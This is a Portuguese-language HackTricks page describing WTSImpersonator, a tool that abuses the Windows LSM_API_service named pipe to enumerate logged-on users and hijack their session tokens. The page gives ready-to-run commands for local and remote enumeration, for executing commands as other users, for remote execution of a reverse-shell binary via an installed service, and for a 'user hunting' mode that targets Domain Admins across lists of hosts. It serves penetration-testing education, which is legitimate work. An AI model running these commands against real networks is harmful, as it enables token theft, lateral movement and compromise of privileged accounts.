# WTS Impersonator

{{#include ../../banners/hacktricks-training.md}}

A ferramenta **WTS Impersonator** explora o **"\\pipe\LSM_API_service"** RPC Named pipe para enumerar furtivamente os usuários conectados e sequestrar seus tokens, contornando as técnicas tradicionais de Token Impersonation. Essa abordagem facilita seamless lateral movements dentro das redes. A inovação por trás dessa técnica é creditada a **Omri Baso, cujo trabalho está disponível no [GitHub](https://github.com/OmriBaso/WTSImpersonator)**.<sup>[[1]](#references)</sup>

### Funcionalidade principal

A ferramenta opera por meio de uma sequência de chamadas de API:
```bash
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Módulos Principais e Uso

- **Enumerando Usuários**: A enumeração de usuários locais e remotos é possível com a ferramenta, usando comandos para cada cenário:

- Localmente:
```bash
.\WTSImpersonator.exe -m enum
```
- Remotamente, especificando um endereço IP ou hostname:
```bash
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Executando Comandos**: Os módulos `exec` e `exec-remote` exigem um contexto de **Service** para funcionar. A execução local requer apenas o executável WTSImpersonator e um comando:

- Exemplo de execução de comando local:
```bash
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- PsExec64.exe pode ser usado para obter um contexto de Service:
```bash
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Execução Remota de Comandos**: Envolve criar e instalar um Service remotamente, de forma semelhante ao PsExec.exe, permitindo a execução com as permissões apropriadas.

- Exemplo de execução remota:
```bash
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Módulo User Hunting**: Tem como alvo usuários específicos em várias máquinas, executando código com as credenciais desses usuários. Isso é especialmente útil para atingir Domain Admins com direitos de admin local em vários sistemas.
- Exemplo de uso:
```bash
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```

## Referências

- [1] [WTSImpersonator - GitHub](https://github.com/OmriBaso/WTSImpersonator)

{{#include ../../banners/hacktricks-training.md}}
